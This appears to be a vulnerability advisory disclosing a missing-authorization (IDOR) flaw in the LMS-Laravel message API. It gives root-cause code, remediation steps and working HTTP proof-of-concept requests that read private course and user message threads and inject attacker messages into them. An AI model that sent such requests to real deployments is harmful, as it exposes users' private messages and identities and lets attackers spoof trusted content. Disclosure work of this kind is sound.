<!-- gist description (stage 6): LMS-Laravel Message API Missing Authorization (Laravel 8) -->

# LMS-Laravel Message API Missing Authorization (Laravel 8)

**CWE-862 · Authenticated missing-authorization (IDOR) on message read/write · any user can dump and inject messages of any Course/Lesson/User**

> **Vendor:** LMS-Laravel (github.com/LMS-Laravel)
> **Product:** LMS-Laravel (Laravel 8 learning management system)
> **Affected version:** master branch, commit 55ad5acbc42ec8ea2d887586f0c02eef0367f0a3 (last commit 2021-09-24; no release tag)
> **Affected endpoints:** GET|POST /api/message (routes/api.php:22, auth:api)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

`GET|POST /api/message` resolves the message target from two attacker-controlled parameters (`type`, `resource`) and builds an Eloquent model name from them (`App\Entities\` + ucfirst(type)), then calls `Model::find($id)`. No enrollment or ownership check is performed anywhere on the path, so any authenticated user can read the full message thread of any Course, Lesson or User, and can inject messages into those threads (read and write both verified).

## 2. Root Cause

| File:Line | Role |
|---|---|
| `routes/api.php:22` | `Route::resource('message', ...)` inside `auth:api` group — authentication only |
| `app/Http/Controllers/MessageController.php:18-24` | `index()`: returns `$resource->messages` JSON for the unvalidated resource |
| `app/Http/Controllers/MessageController.php:32-53` | `store()`: attaches the attacker's message to the unvalidated resource |
| `app/Http/Controllers/MessageController.php:55-61` | `findResource()`: `'App\\Entities\\'.Str::ucfirst($type)` + `$class::find($id)` — zero authorization |

```php
public function index(Request $request)
{
    if($resource = $this->findResource($request->type, $request->resource)) {
        return response()->json($resource->messages);
    }
    ...
}

public function findResource($type, $id)
{
    if($id){
        $class = 'App\\Entities\\'.Str::ucfirst($type);
        return $class::find($id);   // <-- no enrollment / ownership check
    }
}
```

## 3. Prerequisites

- Any authenticated account (lowest-privilege student). `auth:api` is the only gate on the route.
- No enrollment, ownership or role requirement — that is the bug.
- Knowledge (or enumeration) of target resource ids (sequential integers).

## 4. Reproduction

Control — unauthenticated request is redirected to /login (auth:api enforced):

```http
GET /api/message?type=Course&resource=1 HTTP/1.1

HTTP/1.1 302 Found
Location: http://<BASE_URL>/login
```

IDOR read — any valid low-privilege token, attacker never enrolled in course 1:

```http
GET /api/message?type=Course&resource=1 HTTP/1.1
Authorization: Bearer <ANY_VALID_USER_TOKEN>

HTTP/1.1 200 OK
[{"id":1,"user_id":3,"message":"OWNER-SECRET-MSG-1 course thread",
  "messageable_type":"App\\Entities\\Course","user":{"id":3,"name":"Owner Teacher",
  "email":"owner@test.local","username":"owner1", ...}},
 {"id":2,"user_id":3,"message":"OWNER-SECRET-MSG-2 course thread", ...}]
```

IDOR read, second prong — another user's user-scoped thread:

```http
GET /api/message?type=User&resource=3 HTTP/1.1
Authorization: Bearer <ANY_VALID_USER_TOKEN>

HTTP/1.1 200 OK
[... course messages ... {"id":3,"user_id":3,"message":"OWNER-USER-SCOPE-MSG", ...}]
```

IDOR write — inject a message into the victim's course thread:

```http
POST /api/message HTTP/1.1
Authorization: Bearer <ANY_VALID_USER_TOKEN>
Content-Type: application/json

{"type":"Course","resource":"1","message":"ATTACKER-INJECTED-MSG"}

HTTP/1.1 200 OK
{"message":"ATTACKER-INJECTED-MSG","user_id":4,"id":4,
 "messageable_id":1,"messageable_type":"App\\Entities\\Course", ...}
```

The injected row is persisted (DB: `id=4, user_id=4, messageable App\Entities\Course id=1`) and rendered inside the owner's course thread on the owner's next legitimate read. The same works for `{type:"User", resource:3}` (owner's user-scoped thread).

## 5. Confirmed Techniques

- Full local reproduction on the exact master commit (Laravel 8 + Passport `auth:api`, PHP 7.4, MySQL 8.0).
- Seed: owner id=3 owns course 1 with two private messages; attacker id=4 never enrolled (`course_user` table has 0 rows for attacker).
- Control confirmed: unauthenticated request → 302 to /login; authenticated attacker → full thread dump + successful write.
- Attacker message verifiably rendered in the owner's thread after injection (both course-scoped and user-scoped).

## 6. Impact

- Confidentiality: any authenticated user can dump every course/lesson/user message thread on the instance, including owner identity fields (name, email, username).
- Integrity: any authenticated user can plant messages inside arbitrary course/user threads — attacker-controlled content rendered in a trusted LMS context (spoofing/phishing of teachers/courses).
- Fix suggestion: verify enrollment/ownership before returning or attaching messages; whitelist `type`.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (Base 6.5, Medium)

## 8. Remediation

1. In `findResource()` (or its callers), verify the requesting user is enrolled in / owns the target resource before returning or attaching messages (policy check per `type`).
2. Constrain `type` to a whitelist of messageable models instead of building the class name from user input.
3. Add authorization tests (read and write) for `/api/message` to the test suite.

## 9. References

- Project: https://github.com/LMS-Laravel/LMS-Laravel
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- External disclosure: https://gist.github.com/qianqiusujiu/5559ff743e8ead09b74162cf726fdb27
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
